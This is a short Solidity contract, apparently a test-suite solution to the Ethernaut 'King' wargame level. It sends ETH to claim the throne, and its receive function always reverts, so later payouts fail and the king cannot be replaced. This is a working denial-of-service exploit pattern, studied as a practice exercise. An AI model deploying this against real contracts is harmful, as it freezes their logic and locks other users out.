pragma solidity ^0.8.10;

// contracts
import "../src/King/KingFactory.sol";
import "../src/Ethernaut.sol";

contract KingTestBreak {

    receive() external payable {
        revert();
    }

    function exploit(address _target) external payable {
        _target.call{value: msg.value}("");
    }
}